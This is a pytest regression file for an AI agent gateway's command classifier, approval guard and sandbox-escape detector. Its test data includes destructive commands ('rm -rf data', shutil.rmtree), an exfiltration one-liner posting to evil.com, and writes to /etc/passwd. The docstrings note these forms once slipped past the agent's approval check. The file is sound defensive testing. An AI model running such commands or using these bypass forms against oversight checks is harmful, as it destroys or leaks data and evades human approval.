# -*- coding: utf-8 -*-
"""工作区三问题回归: 审批 pending 清除 + 越权读不拦 + 禁则区分读临时文件/执行临时脚本"""
import sys

sys.path.insert(0, ".")
import pytest


# ===== 修复1: 确认后清除 pending =====
@pytest.fixture()
def _approval_env(monkeypatch):
    import agent_gateway_enhanced as main
    import core.gateway.write_gate as _wg

    monkeypatch.setattr(_wg, "_pending_writes", {})
    monkeypatch.setattr(main, "_pending_writes", _wg._pending_writes)
    monkeypatch.setattr(main, "_persist_pending_writes", lambda *a, **k: None)
    # P3-A: _handle_write_approval/_resume_bridge_after_approval 已归位 core.gateway.approval
    # → 必须同时 patch 该模块命名空间(否则其 import 副本仍指向旧 dict)
    import core.gateway.approval as _ap

    monkeypatch.setattr(_ap, "_pending_writes", _wg._pending_writes)
    monkeypatch.setattr(_ap, "_persist_pending_writes", lambda *a, **k: None)
    monkeypatch.setattr(_ap, "_record_approval", lambda *a, **k: None)
    # _resume_bridge_after_approval 内局部 import, 需 patch 源头模块
    import core.gateway.tool_router as _tr

    monkeypatch.setattr(_tr, "_execute_sandbox_tool", lambda *a, **k: {"success": True, "path": "a.py"})
    import core.gateway.guards.runner as _gr

    monkeypatch.setattr(_gr, "run_pre_guards", lambda *a, **k: None)
    monkeypatch.setattr(_gr, "run_post_guards", lambda *a, **k: None)
    return main


def test_python_c_write_classified_as_write():
    """d1（批90）起：python -c 是「任意代码载体」→ **一律 write**（走审批），不看内容。

    批129 同步断言（体检项 54：旧假设被证伪 → 改测试 + 写理由）：
    本用例原先断言「只读 -c → read」，那是 2026-08-30 的细粒度假设，已被 d1 取代 ——
    内容判据追不上（rmtree / Path.unlink / subprocess / ctypes … 无穷，批58 结论），
    且实测 6/6 条破坏/外发命令可借「无写标记」被放行为 read（批128 反证）。
    故原 read_cases 一律改判 write；仍应放行的 read 形态见 test_read_forms_are_not_upgraded。
    """
    from core.gateway.sandbox_util import _classify_command

    q = chr(39)
    dq = chr(34)
    write_cases = [
        "python3 -c " + dq + "open(" + q + "x" + q + "," + q + "w" + q + ").write(" + q + "hi" + q + ")" + dq,
        "python3 -c " + dq + "import os; os.remove(" + q + "z" + q + ")" + dq,
        "python3 -c " + dq + "Path(" + q + "x" + q + ").write_text(" + q + "hi" + q + ")" + dq,
        "python3 -c " + dq + "open(" + q + "y" + q + "," + q + "a" + q + ").write(" + q + "x" + q + ")" + dq,
    ]
    # 批129：原 read_cases —— 只读代码**也是** write（载体即判据，不看内容）
    carrier_cases = [
        "python3 -c " + dq + "open(" + q + "x" + q + ").read()" + dq,
        "python3 -c " + dq + "print(" + q + "hi" + q + ")" + dq,
        "python3 -c " + dq + "lines=open(" + q + "x" + q + ").read().splitlines()" + dq,
        "python3 -c " + dq + "print(open(" + q + "x" + q + ").read())" + dq,
    ]
    for cmd in write_cases:
        assert _classify_command(cmd) == "write", "应归 write: " + cmd[:60]
    for cmd in carrier_cases:
        assert _classify_command(cmd) == "write", "任意代码载体应 write(不看内容): " + cmd[:60]


def test_approval_guard_covers_exec_write(monkeypatch):
    """execute_command 写命令(含 python -c)触发审批；**只读 python -c 同样触发**（批129 同步 d1）。

    批129：原断言「读命令不应触发审批」编码的是 d1 之前的假设（当时只读 -c 判 read）。
    d1 起任意代码载体一律 write ⇒ 只读 -c 也进审批，且理由文案必须与单一来源 exfil_note 逐字一致
    （批91 约定：文案不能有第二套）。
    """
    from core.gateway.guards.registry import ApprovalGuard
    from core.gateway.shared_state import clear_approved_files

    g = ApprovalGuard()
    clear_approved_files("s_exec")
    # python -c open('w') 写 → write_pending
    d1 = g.check(
        {
            "tool": "execute_command",
            "session_id": "s_exec",
            "tool_call_id": "c1",
            "args": {"command": "python3 -c \"open('x','w').write('hi')\""},
        }
    )
    assert d1 is not None and d1.get("status") == "write_pending", "python -c 写应触发审批: " + str(d1)
    # 只读 python -c → **同样**进审批（批129：载体即判据，不看内容）
    _cmd_read = "python3 -c \"print(open('x').read())\""
    d2 = g.check(
        {"tool": "execute_command", "session_id": "s_exec", "tool_call_id": "c2", "args": {"command": _cmd_read}}
    )
    assert d2 is not None and d2.get("status") == "write_pending", "只读 python -c 也应进审批: " + str(d2)
    from core.gateway.sandbox_util import exfil_note as _en

    assert _en(_cmd_read), "exfil_note 应给出「任意代码」文案"
    assert _en(_cmd_read) in str(d2.get("reason", "")), "reason 必须逐字包含单一来源文案: " + str(d2.get("reason"))
    # 已批准(approved id 匹配) → 放行
    d3 = g.check(
        {
            "tool": "execute_command",
            "session_id": "s_exec",
            "tool_call_id": "c3",
            "approved": {"id": "c3", "approved": True},
            "args": {"command": "python3 -c \"open('x','w').write('hi')\""},
        }
    )
    assert d3 is None, "已批准应放行: " + str(d3)
    clear_approved_files("s_exec")


def test_exec_sed_i_sop_mirror_blocked():
    """D4 漏洞修复: execute_command sed -i 直写 SOP 镜像 → 拒绝并引导 update_sop"""
    from core.gateway.guards.registry import ApprovalGuard

    g = ApprovalGuard()
    # sed -i 写 SOP 镜像 → forbidden
    d1 = g.check(
        {
            "tool": "execute_command",
            "session_id": "s_mir",
            "tool_call_id": "c1",
            "args": {"command": "sed -i '206r data/tmp/x.md' docs/reports/platform_publish_workflow.md"},
        }
    )
    assert d1 is not None and d1.get("status") == "forbidden", "sed -i 写 SOP 镜像应拒绝: " + str(d1)
    assert "obsidian_knowledge" in d1.get("reason", ""), "应引导 update_sop: " + str(d1)
    # python open() 写 SOP 镜像 → 拒绝
    d2 = g.check(
        {
            "tool": "execute_command",
            "session_id": "s_mir",
            "tool_call_id": "c2",
            "args": {"command": "python3 -c \"open('docs/reports/fanqie_promotion_sop.md','w').write('x')\""},
        }
    )
    assert d2 is not None and d2.get("status") == "forbidden", "python open() 写 SOP 镜像应拒绝: " + str(d2)
    # 普通写命令(非 SOP) → 走审批(write_pending), 不是 forbidden
    d3 = g.check(
        {
            "tool": "execute_command",
            "session_id": "s_mir",
            "tool_call_id": "c3",
            "args": {"command": "python3 -c \"open('data/x.txt','w').write('hi')\""},
        }
    )
    assert d3 is not None and d3.get("status") == "write_pending", "普通写应走审批: " + str(d3)


def test_approval_tmp_debug_bypass():
    """R1 修复: data/tmp/ 调试脚本免审批(不轰炸用户), 非 tmp 写仍审批"""
    from core.gateway.guards.registry import ApprovalGuard
    from core.gateway.shared_state import clear_approved_files

    g = ApprovalGuard()
    clear_approved_files("s_tmp")
    # data/tmp 写文件 → 放行(免审批)
    d1 = g.check(
        {
            "tool": "write_file",
            "session_id": "s_tmp",
            "tool_call_id": "c1",
            "args": {"path": "data/tmp/decode_gn.py", "content": "x"},
        }
    )
    assert d1 is None, "data/tmp 写应免审批: " + str(d1)
    # execute_command 写 data/tmp → 放行
    d2 = g.check(
        {
            "tool": "execute_command",
            "session_id": "s_tmp",
            "tool_call_id": "c2",
            "args": {"command": "python3 -c \"open('data/tmp/out.txt','w').write('x')\""},
        }
    )
    assert d2 is None, "写 data/tmp 命令应免审批: " + str(d2)
    # 非 tmp / 非 WriteTier 白名单写(项目文档) → 仍审批
    # ⑬(2026-09-13) 换路径: 原用 data/reports/report.md, 但 2026-09-11 三档 WriteTier
    # 已把 data/reports/ 列入 _ALLOW_PREFIXES(脱敏产物 → allow 自动) → 旧断言与新政冲突
    d3 = g.check(
        {
            "tool": "write_file",
            "session_id": "s_tmp",
            "tool_call_id": "c3",
            "args": {"path": "docs/project_plan.md", "content": "x"},
        }
    )
    assert d3 is not None and d3.get("status") == "write_pending", "项目文档写应审批: " + str(d3)
    # 正向锁住 WriteTier 新语义: 脱敏产物目录 data/reports/ → allow 自动放行
    d4 = g.check(
        {
            "tool": "write_file",
            "session_id": "s_tmp",
            "tool_call_id": "c4",
            "args": {"path": "data/reports/report.md", "content": "x"},
        }
    )
    assert d4 is None, "data/reports/ 应自动放行(WriteTier allow): " + str(d4)
    clear_approved_files("s_tmp")


def test_drift_detection_in_source():
    """R2 修复: 连续 8 次调试脚本调用 → 注入换路提示（D3 归位 tool_runner）"""
    _SRC = open("core/gateway/v9_bridge/tool_runner.py", encoding="utf-8").read()
    assert "drift_" in _SRC, "应有漂移计数 key"
    assert "已连续 8 次写临时调试脚本" in _SRC, "应有漂移提示文案"
    assert "死胡同" in _SRC, "应提示换更直接方式"


def test_web_search_tool_registered():
    """web_search 工具: 注册 + 白名单 + 插件存在(解决 Google News 混淆 URL 死胡同)"""
    from core.gateway.tool_router import _TOOL_REGISTRY, _execute_sandbox_tool

    assert "web_search" in _TOOL_REGISTRY, "web_search 应注册"
    # schema 在默认工具集
    from core.lib.gateway_helpers import _get_default_tools

    names = [t.get("function", {}).get("name") for t in _get_default_tools()]
    assert "web_search" in names, "web_search 应在默认工具集"
    # 缺 query → 明确错误
    r = _execute_sandbox_tool("web_search", {}, "u1", "s1")
    assert r.get("success") is False and "query" in r.get("error", ""), str(r)


def test_web_search_recursion_key_by_query():
    """web_search 递归 key 用 query(不同搜索词不误判递归)"""
    from core.gateway.path_utils import _extract_tool_path

    k1 = _extract_tool_path({"query": "Anthropic 侵权"}, "web_search")
    k2 = _extract_tool_path({"query": "Claude 训练"}, "web_search")
    assert k1 != k2, "不同 query 应不同 key: %s vs %s" % (k1, k2)
    assert k1.startswith("web_search:"), "key 应带 web_search 前缀: " + k1
    assert k1 != "<no-path>", "不应落 <no-path>"


def test_write_file_tmp_bypasses_similarity(tmp_path):
    """data/tmp 调试脚本重写跳过相似度保护(与免审批配套)"""
    from core.tools.write_file import WriteFilePlugin

    target = tmp_path / "data" / "tmp" / "decode_gn.py"
    target.parent.mkdir(parents=True, exist_ok=True)
    target.write_text("旧脚本第一行" + chr(10) + "旧脚本第二行" + chr(10) + "旧脚本第三行" + chr(10) * 20, encoding="utf-8")

    class Ctx:
        base = tmp_path

        def resolve_path(self, base, p):
            return base / p

        messages = []
        user_id = "u1"
        session_id = "s_tmp2"
        consecutive_reads = {}
        consecutive_lists = {}
        last_read_fingerprints = {}
        recap_checkpoint = None
        task_name_async = ""
        round = 1
        update_world_model = lambda *a, **k: None
        sandbox_git_pre_write = lambda *a, **k: None
        sandbox_git_post_write = lambda *a, **k: None
        git_status = lambda *a, **k: None
        policy = {}
        js_rollback_count = {}

    # 完全不同的新内容(相似度低) → data/tmp 应放行
    r = WriteFilePlugin().execute({"path": "data/tmp/decode_gn.py", "content": "全新调试脚本逻辑" + chr(10) * 10}, Ctx())
    assert r.get("success") is True, "data/tmp 重写应跳过相似度: " + str(r)
    # 非 tmp 低相似度 → 仍拒绝
    target2 = tmp_path / "data" / "reports" / "report.md"
    target2.parent.mkdir(parents=True, exist_ok=True)
    target2.write_text("报告旧内容" + chr(10) * 20, encoding="utf-8")
    r2 = WriteFilePlugin().execute({"path": "data/reports/report.md", "content": "完全不同的新报告" + chr(10) * 5}, Ctx())
    assert r2.get("success") is False, "非 tmp 低相似度应拒绝: " + str(r2)


def test_goal_context_injection_non_active():
    """W3 修复: 非 active goal 也注入 objective(用户"继续"深挖任务不丢失上下文)"""
    import core.gateway.goal_state as gs

    u, s = "u1", "sess_goal_ctx"
    gs._goals.clear()
    gs.create_goal(u, s, "深挖 Claude 训练原文")
    # 置为非 active(如中途取消)
    gs.update_goal_status(u, s, "failed", note="中途取消")
    txt = gs.goal_context_injection(u, s)
    assert txt and "深挖 Claude 训练原文" in txt, "非 active goal 也应注入 objective: " + str(txt)
    assert "非active" in txt or "中断" in txt, "应标注非 active 状态: " + str(txt)


def test_private_host_dns_failure_not_blocked():
    """W2 修复: DNS 解析失败不再误判内网(返回 False, 交 HTTP 层处理)"""
    from core.lib.gateway_helpers import _is_private_host

    # 明确内网仍拦
    assert _is_private_host("localhost") is True
    assert _is_private_host("192.168.1.1") is True
    # 解析失败(畸形/不存在域名) → False(不再保守拒绝误伤)
    assert _is_private_host("") is True  # 空 hostname 仍视为无效
    # 正常公网域名 → False
    assert _is_private_host("www.sina.com.cn") is False


def test_python_script_exec_classified_read():
    """执行 data/tmp 调试脚本 → read(不触发审批)；python -c **无论读写都 write**（批129 同步 d1）"""
    from core.gateway.sandbox_util import _classify_command

    assert _classify_command("python3 data/tmp/fetch_research.py") == "read", "执行脚本应 read"
    assert _classify_command("python3 clawsjoy_dev/data/tmp/parse_news.py") == "read"
    assert _classify_command("cd data/tmp && python3 fetch_research.py") == "read"
    # python -c 写操作仍 write(不回归)
    d = chr(34)
    w = "python3 -c " + d + "open('x','w').write('hi')" + d
    assert _classify_command(w) == "write", "python -c 写应 write"
    r = "python3 -c " + d + "print(1)" + d
    # 批129：原断言「python -c 读应 read」属 d1 之前的假设，已改判 write（载体即判据）
    assert _classify_command(r) == "write", "python -c 只读也应 write"


def test_code_carriers_are_never_read():
    """守卫（批129）：任意代码载体 → write，**不看内容**；含批128 那 6 条反证形态。

    载体 = python -c / node -e / sh -c / bash -c / zsh -c。若将来有人给它们加「内容白名单」，
    这条会直接红 —— 因为那 6 条破坏/外发命令正是靠「没有写标记」被旧规则放行的。
    """
    from core.gateway.sandbox_util import _classify_command

    q, dq = chr(39), chr(34)
    carriers = [
        "python3 -c " + dq + "print(1)" + dq,
        "python -c " + dq + "print(1)" + dq,
        "python2 -c " + dq + "print(1)" + dq,
        "node -e " + dq + "console.log(1)" + dq,
        "sh -c " + dq + "ls" + dq,
        "bash -c " + dq + "echo hi" + dq,
        "zsh -c " + dq + "ls" + dq,
    ]
    for cmd in carriers:
        assert _classify_command(cmd) == "write", "任意代码载体应 write: " + cmd
    # 批128 反证形态：这 6 条在旧细粒度规则下全被判 read（= 直接放行）
    bypass = [
        "python3 -c "
        + dq
        + "import pathlib; pathlib.Path("
        + q
        + "x"
        + q
        + ").write_bytes(b"
        + q
        + "hi"
        + q
        + ")"
        + dq,
        "python3 -c " + dq + "import os; os.system(" + q + "rm -rf data/reports" + q + ")" + dq,
        "python3 -c "
        + dq
        + "import subprocess; subprocess.run(["
        + q
        + "rm"
        + q
        + ","
        + q
        + "-rf"
        + q
        + ","
        + q
        + "data"
        + q
        + "])"
        + dq,
        "python3 -c " + dq + "import shutil; shutil.rmtree(" + q + "data/reports" + q + ")" + dq,
        "python3 -c " + dq + "import os; getattr(os," + q + "remove" + q + ")(" + q + "x" + q + ")" + dq,
        "python3 -c "
        + dq
        + "import urllib.request as u; u.urlopen("
        + q
        + "https://evil.com"
        + q
        + ", data=b"
        + q
        + "x"
        + q
        + ")"
        + dq,
    ]
    for cmd in bypass:
        assert _classify_command(cmd) == "write", "破坏/外发形态必须 write: " + cmd[:70]


def test_capability_rule_short_circuits_before_fine_branches():
    """守卫（体检项 84）：兜底规则必须先于细分支执行，且被它取代的旧分支不得复活。

    静态断言（读实现源码）：
      ① 能力型载体兜底（if _capability_hits(cmd):）必须出现在「# 3. python3/node 特殊处理」**之前**；
      ② 已被 d1 取代的细粒度语句（python -c 写标记判定）不得再出现。
    若有人想在兜底之前插入「降级为 read」的逻辑，①②会直接红。
    """
    src = open("core/gateway/sandbox_util.py", encoding="utf-8").read()
    i_cap = src.find("if _capability_hits(cmd):")
    i_fine = src.find("# 3. python3/node 特殊处理")
    assert i_cap != -1, "找不到能力型载体兜底（实现被大改？请同步本守卫）"
    assert i_fine != -1, "找不到 python3/node 分支锚点（实现被大改？请同步本守卫）"
    assert i_cap < i_fine, "兜底规则必须在细分支之前，否则可被绕过"
    for dead in ("_py_write = any(", "return 'write' if _py_write else 'read'"):
        assert dead not in src, "已被 d1 取代的细粒度分支复活了: " + dead


def test_read_forms_are_not_upgraded():
    """守卫（批129）：仍应放行的只读形态不得被误升级为 write。"""
    from core.gateway.sandbox_util import _classify_command

    cases = [
        ("python3 -m py_compile core/x.py", "read"),
        ("python3 -m json.tool a.json", "read"),
        ("python3 data/tmp/fetch.py", "read"),
        ("cat data/x.md", "read"),
        ("ls -la", "read"),
        ("curl https://api.deepseek.com/v1/models", "read"),
    ]
    for cmd, want in cases:
        assert _classify_command(cmd) == want, "误升级为 write: " + cmd


def test_tmp_autoclean_in_source():
    """data/tmp 自动清理钩子存在(>24h 临时文件启动时清除)"""
    _SRC = open("core/gateway/v9_bridge/loop.py", encoding="utf-8").read()
    assert "data/tmp 自动清理" in _SRC, "应有 tmp 自动清理注释"
    assert "86400" in _SRC, "应有 24h TTL"


def test_write_approval_pending_cleared(_approval_env):
    """确认写入执行完成后 → _pending_writes 清除(不再重复「待确认」)"""
    main = _approval_env
    main._pending_writes["s1"] = {
        "id": "call_1",
        "tool": "write_file",
        "path": "a.py",
        "content_preview": "x",
        "ts": 0,
        "approved": True,
    }
    with main.app.app_context():  # jsonify 需要 Flask app context
        r = main._resume_bridge_after_approval("u1", "s1", [], object(), main._pending_writes["s1"])
    assert r.status_code == 200 and b"write_confirmed" in r.get_data(), "应返回 write_confirmed"
    assert main._pending_writes.get("s1") is None, "确认后 pending 应清除, 实际: %r" % main._pending_writes.get("s1")


# ===== 修复2: 越权读不拦 =====
def test_escape_read_with_tmp_output_allowed():
    """python3 -c 读 /etc + 输出重定向 /tmp → 放行(tmp 不是系统目录边界)"""
    from core.gateway.security import _detect_sys_escape

    assert _detect_sys_escape("python3 -c \"print(open('/etc/hostname').read())\" 1>/tmp/out.txt") is None
    assert _detect_sys_escape("python3 -c \"open('/tmp/x','w').write('hi')\"") is None, "写 /tmp 临时文件应放行"


def test_escape_system_write_still_blocked():
    """写 /etc 等真实系统目录 → 仍拦截"""
    from core.gateway.security import _detect_sys_escape

    r = _detect_sys_escape("echo x > /etc/hosts")
    assert r is not None and r[1] == "写入系统目录"
    r2 = _detect_sys_escape("python3 -c \"open('/etc/x','w')\"")
    assert r2 is not None and r2[1] == "open 写系统路径"


# ===== 修复3: 禁则区分读临时文件 / 执行临时脚本 =====
def test_forbidden_tmp_read_allowed():
    """读/引用 _tmp_ 临时文件 → 放行(禁则只拦执行临时脚本)"""
    from core.gateway.guards.registry import ForbiddenGuard

    g = ForbiddenGuard()
    assert (
        g.check(
            {
                "tool": "execute_command",
                "args": {"command": "python3 -c \"import json; d=json.load(open('_tmp_zhihu_cookies.txt'))\""},
            }
        )
        is None
    )
    assert g.check({"tool": "execute_command", "args": {"command": "cat _tmp_zhihu_cookies.txt"}}) is None


def test_forbidden_tmp_script_execution_blocked():
    """执行临时脚本(python3 _tmp_x.py / bash _gate.sh) → 仍拦截"""
    from core.gateway.guards.registry import ForbiddenGuard

    g = ForbiddenGuard()
    for cmd in ("python3 _tmp_test.py", "bash _gate_check.sh"):
        d = g.check({"tool": "execute_command", "args": {"command": cmd}})
        assert d is not None and d.get("status") == "forbidden", "应拦: %s" % cmd


def test_write_approve_idempotent(monkeypatch):
    """2026-08-30 对齐 harness: pending 不存在(已执行/已过期) → 显式返回 write_expired,
    不再假成功「已确认执行」(用户点卡片以为成功, 实际没写入 → 困惑)"""
    import agent_gateway_enhanced as main
    import core.gateway.write_gate as _wg

    monkeypatch.setattr(_wg, "_pending_writes", {})
    monkeypatch.setattr(main, "_pending_writes", _wg._pending_writes)
    monkeypatch.setattr(main, "_persist_pending_writes", lambda *a, **k: None)
    monkeypatch.setattr(main, "_record_approval", lambda *a, **k: None)
    # P3-A: _handle_write_approval 已归位 core.gateway.approval → patch 该模块命名空间
    import core.gateway.approval as _ap

    monkeypatch.setattr(_ap, "_pending_writes", _wg._pending_writes)
    monkeypatch.setattr(_ap, "_persist_pending_writes", lambda *a, **k: None)
    monkeypatch.setattr(_ap, "_record_approval", lambda *a, **k: None)
    with main.app.app_context():
        r = main._handle_write_approval("u1", "s1", [], object(), {"id": "call_x", "action": "approve"})
    assert r.status_code == 200
    data = r.get_json()
    assert data.get("success") is False and data.get("status") == "write_expired", data
    assert "过期" in data.get("message", ""), "应提示审批过期: %s" % data.get("message")


# ===== 修复4 (2026-08-30 架构根治 Phase1): heredoc 写项目文件禁止 =====
def test_heredoc_write_project_file_blocked():
    """heredoc 写项目文件(cat/tee/bash/python open) → 硬拦截(data/tmp 豁免)"""
    from core.gateway.security import _detect_sys_escape

    NL = chr(10)
    SQ = chr(39)
    DQ = chr(34)
    blocked = [
        "cat>docs<<EOF",
        "cat > docs/test.md <<EOF",
        "cat >> docs/log.md <<EOL",
        "tee docs/a.md <<EOF",
        "python3 <<EOF" + NL + "open(" + SQ + "docs/x.py" + SQ + "," + SQ + "w" + SQ + ")" + NL + "EOF",
        "python3 - <<PY" + NL + "open(" + DQ + "docs/x.py" + DQ + "," + DQ + "a" + DQ + ")" + NL + "PY",
        "python3 <<EOF" + NL + "Path(" + DQ + "docs/x.py" + DQ + ").write_text(" + DQ + "hi" + DQ + ")" + NL + "EOF",
        "bash <<EOF" + NL + "echo x > docs/x.sh" + NL + "EOF",
    ]
    for cmd in blocked:
        r = _detect_sys_escape(cmd)
        assert r is not None, "应拦截: %r" % cmd
        assert "heredoc" in r[1], "拦截理由应含 heredoc: %s" % (r[1],)


def test_heredoc_data_tmp_and_read_allowed():
    """data/tmp heredoc 写 + 纯读取 heredoc + python -c 写 /tmp → 放行"""
    from core.gateway.security import _detect_sys_escape

    NL = chr(10)
    SQ = chr(39)
    DQ = chr(34)
    allowed = [
        "cat > data/tmp/x.py <<EOF",
        "python3 <<EOF" + NL + "open(" + SQ + "data/tmp/x.py" + SQ + "," + SQ + "w" + SQ + ")" + NL + "EOF",
        "cat <<EOF" + NL + "hello" + NL + "EOF",
        "python3 <<EOF" + NL + "print(open(" + SQ + "docs/x.py" + SQ + ").read())" + NL + "EOF",
        "python3 -c "
        + DQ
        + DQ
        + "open("
        + SQ
        + "/tmp/x"
        + SQ
        + ","
        + SQ
        + "w"
        + SQ
        + ").write("
        + SQ
        + "hi"
        + SQ
        + ")"
        + DQ
        + DQ,
        "echo test > /etc/passwd",  # 仍走系统目录拦截, 但理由不同
    ]
    for cmd in allowed:
        r = _detect_sys_escape(cmd)
        if cmd.startswith("echo test"):
            assert r is not None and r[1] == "写入系统目录"
        else:
            assert r is None, "误拦截: %r -> %r" % (cmd, r)


# ===== R1+R2 (2026-08-30 架构根治 v2): token 水位轮次 + read 缓存幂等 + user 保留压缩 =====
def test_r2_read_file_cache_idempotent():
    """R2: 同 session 重复读同一路径且内容未变 → 二次读返回 cached, 不再全量注入上下文"""
    import sys
    import tempfile
    from pathlib import Path as _P

    from core.gateway.shared_state import _read_content_cache
    from core.tools.read_file import ReadFilePlugin

    _read_content_cache.clear()
    tmp = _P(tempfile.mkdtemp())
    f = tmp / "test_r2_cache.py"
    f.write_text("x = 1" + chr(10), encoding="utf-8")

    class _FakeExec:
        def execute(self, name, params):
            return {"success": True, "content": _P(params["path"]).read_text(encoding="utf-8")}

    class _Ctx:
        pass

    ctx = _Ctx()
    ctx.messages = []
    ctx.consecutive_reads = {}
    ctx.classify_task_type = lambda m: "analysis"
    ctx.get_skeleton_by_path = lambda *a, **k: None
    ctx.is_repeat_read_attempt = lambda *a, **k: False
    ctx.is_stale_read = lambda *a, **k: False
    ctx.tool_executor = _FakeExec()
    ctx.base = tmp
    ctx.resolve_path = lambda base, pth: (base / pth)
    ctx.user_id = "u1"
    ctx.session_id = "s_r2"
    r1 = ReadFilePlugin().execute({"path": str(f)}, ctx)
    r2 = ReadFilePlugin().execute({"path": str(f)}, ctx)
    assert r1.get("cached", False) is False, "首次读不应 cached"
    assert r2.get("cached", False) is True, "二次读应 cached(幂等)"
    assert "已读缓存" in str(r2.get("content", "")), "二次读应返回短提示"


def test_r2_read_cache_invalidate_on_write():
    """R2: 写文件后失效 → 再读应返回全文(非 cached)"""
    import sys
    import tempfile
    from pathlib import Path as _P

    from core.gateway.shared_state import _invalidate_read_content_cache, _read_content_cache
    from core.tools.read_file import ReadFilePlugin

    _read_content_cache.clear()
    tmp = _P(tempfile.mkdtemp())
    f = tmp / "test_r2_inv.py"
    f.write_text("v1" + chr(10), encoding="utf-8")

    class _FakeExec:
        def execute(self, name, params):
            return {"success": True, "content": _P(params["path"]).read_text(encoding="utf-8")}

    class _Ctx:
        pass

    ctx = _Ctx()
    ctx.messages = []
    ctx.consecutive_reads = {}
    ctx.classify_task_type = lambda m: "analysis"
    ctx.get_skeleton_by_path = lambda *a, **k: None
    ctx.is_repeat_read_attempt = lambda *a, **k: False
    ctx.is_stale_read = lambda *a, **k: False
    ctx.tool_executor = _FakeExec()
    ctx.base = tmp
    ctx.resolve_path = lambda base, pth: (base / pth)
    ctx.user_id = "u1"
    ctx.session_id = "s_r2b"
    ReadFilePlugin().execute({"path": str(f)}, ctx)
    f.write_text("v2 changed" + chr(10), encoding="utf-8")
    _invalidate_read_content_cache("s_r2b", str(f.resolve()))
    r3 = ReadFilePlugin().execute({"path": str(f)}, ctx)
    assert r3.get("cached", False) is False, "文件变更后失效缓存, 应返回全文"
    assert "v2 changed" in str(r3.get("content", "")), "应读到新内容"


def test_r2_compress_keeps_all_user_messages():
    """R2: 压缩保留所有 user 消息原文(任务指令/追加指示), 只压旧工具/assistant 输出"""
    from core.gateway.message_assembler import _compress_messages, _safe_compress_messages

    msgs = [
        {"role": "system", "content": "你是助手"},
        {"role": "user", "content": "任务: 修复 bug A"},
        {
            "role": "assistant",
            "content": "开始",
            "tool_calls": [{"id": "c1", "type": "function", "function": {"name": "read_file", "arguments": "{}"}}],
        },
        {"role": "tool", "tool_call_id": "c1", "content": "long content " + "x" * 2000},
        {"role": "assistant", "content": "继续"},
        {"role": "user", "content": "追加指示: 记得提交 git"},
    ]
    out = _safe_compress_messages(msgs, "u1", "s1", keep=2)
    users = [m.get("content") for m in out if m.get("role") == "user"]
    assert any("任务: 修复" in u for u in users), "任务 user 消息丢失"
    assert any("追加指示" in u for u in users), "追加 user 消息丢失"
    out2 = _compress_messages(msgs, "u1", "s1", keep=4)
    users2 = [m.get("content") for m in out2 if m.get("role") == "user"]
    sysmsgs2 = [m.get("content") for m in out2 if m.get("role") == "system"]
    assert any("任务: 修复" in u for u in users2) or any("任务目标" in s and "修复 bug A" in s for s in sysmsgs2), "主路径任务 user 丢失"
    assert any("追加指示" in u for u in users2), "主路径追加 user 丢失"


def test_r1_goal_info_token_fields():
    """R1: goal_info 增加 token 预算/已用/剩余字段(续跑改 token 驱动)"""
    from agent_gateway_enhanced import _goal_info_for_response

    info = _goal_info_for_response("no_such_session_r1xyz")
    assert info.get("token_budget") == 500000, "token_budget 默认 500000"
    assert info.get("token_used") == 0
    assert info.get("token_left") == 500000


# ===== R2 补漏 (2026-08-30 架构根治): execute_command 读文件去重 =====
def test_exec_read_dedup_logic():
    """R2 补漏: python3 -c open().read / cat 读同一文件 → 二次读返回已读缓存短提示"""
    import hashlib
    import re

    NL = chr(10)

    def dedup(session_id, bfn, btr, bargs, cache):
        if bfn == "execute_command" and isinstance(btr, dict) and btr.get("success"):
            cmd3 = str(bargs.get("command") or "")
            is_read_cmd = bool(
                re.search(
                    r"python3?\s+-c\b[\s\S]*?(?:open\([^)]*\)|read_text|readlines\(|\.read\(|cat\s+[\w./-]+)", cmd3
                )
                or re.search(r"^cat\s+[\w./-]+", cmd3.strip())
            )
            if is_read_cmd:
                m3 = re.search(r"open\(\s*['\"]([^'\"]+)['\"]", cmd3)
                if not m3:
                    m3 = re.search(r"cat\s+([\w./-]+)", cmd3)
                if m3:
                    rp3 = m3.group(1)
                    stdout3 = str(btr.get("stdout") or "")
                    if stdout3:
                        h3 = hashlib.md5(stdout3.encode("utf-8", "ignore")).hexdigest()
                        sess3 = cache.setdefault(session_id, {})
                        rk3 = "r2:" + rp3
                        if sess3.get(rk3) == h3:
                            btr = dict(btr)
                            btr["stdout"] = "[已读缓存] " + rp3 + " 内容与上次读取一致(" + str(len(stdout3)) + " 字符)。"
                            btr["r2_cached"] = True
                            return btr, True
                        sess3[rk3] = h3
        return btr, False

    cache = {}
    # 用户场景: python3 -c 多行脚本读同一文件 3 次
    cmd = (
        "python3 -c " + chr(34) + NL + "t = open('data/research/x.txt').read()" + NL + "print(t[:2100])" + NL + chr(34)
    )
    out = "content " + "y" * 500
    r1, c1 = dedup("s1", "execute_command", {"success": True, "stdout": out}, {"command": cmd}, cache)
    r2, c2 = dedup("s1", "execute_command", {"success": True, "stdout": out}, {"command": cmd}, cache)
    r3, c3 = dedup("s1", "execute_command", {"success": True, "stdout": out}, {"command": cmd}, cache)
    assert c1 is False, "首次读不缓存"
    assert c2 is True and c3 is True, "二三次读应去重"
    assert "[已读缓存]" in r2["stdout"], "二次读返回短提示"
    # cat 场景
    r1b, c1b = dedup("s1", "execute_command", {"success": True, "stdout": "abc"}, {"command": "cat data/x.txt"}, cache)
    r2b, c2b = dedup("s1", "execute_command", {"success": True, "stdout": "abc"}, {"command": "cat data/x.txt"}, cache)
    assert c1b is False and c2b is True, "cat 重复读应去重"
    # 写命令不误伤
    r3b, c3b = dedup("s1", "execute_command", {"success": True, "stdout": "ok"}, {"command": "echo x > /tmp/y"}, cache)
    assert c3b is False, "写命令不应触发读缓存"


def test_token_water_guard_message_honest():
    """R1: token 水位触发时返回消息明确「预算不足未完全完成」而非假完成（S6-C/S6-E 归位）"""
    _RG = open("core/gateway/v9_bridge/response_guard.py", encoding="utf-8").read()
    _LOOP = open("core/gateway/v9_bridge/loop.py", encoding="utf-8").read()
    _SRC = open("agent_gateway_enhanced.py", encoding="utf-8").read()
    assert '"success": True, "status": "token_water"' in _RG, "水位应成功收尾"
    assert "预算不足" in _RG, "水位消息应明确预算不足"
    assert "未完全完成" in _RG, "水位消息应明确未完全完成"
    assert "_token_water_hit" in _SRC, "水位标记存在"
    assert "R1_TOKEN_WATER" in _LOOP, "软水位检查存在"


# ===== R3 (2026-08-30 架构根治): write_file reason + 批量审批 =====
def test_r3_write_file_schema_has_reason():
    """R3: write_file schema 增加 reason 字段(必填)"""
    src = open("core/lib/gateway_helpers.py", encoding="utf-8").read()
    assert '"reason"' in src, "schema 缺 reason 字段"
    assert '"required": ["path", "reason"]' in src, "reason 应必填"
